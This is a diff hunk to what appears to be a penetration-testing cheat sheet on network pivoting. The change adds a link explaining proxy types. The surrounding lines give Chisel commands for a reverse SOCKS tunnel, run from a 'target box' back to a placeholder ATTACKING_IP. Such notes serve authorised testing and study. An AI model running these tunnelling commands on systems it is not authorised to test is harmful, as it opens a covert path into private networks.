@@ -56,7 +56,8 @@ Set up dynamic tunnels to scan through them (see scanning section below for more
 [Chisel](https://github.com/jpillora/chisel)   
 [Pivoting with Chisel Guide](https://ap3x.github.io/posts/pivoting-with-chisel/)  
 Good for getting through firewalls, need correct copies of binaries on both target / attack box  
-Need to change /etc/proxychains4.conf socks4 to socks5 on attack box 
+Need to change /etc/proxychains4.conf socks4 to socks5 on attack box    
+[HTTP vs SOCKS4 vs SOCKS5 proxies](https://medium.com/@ThibeauM/difference-between-http-socks4-and-socks5-proxies-85aca2a9e4ae)    
 ### Chisel socks Reverse Proxy 
     attack box    $ ./chisel server -p LISTEN_PORT --reverse &  
     target box    $ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
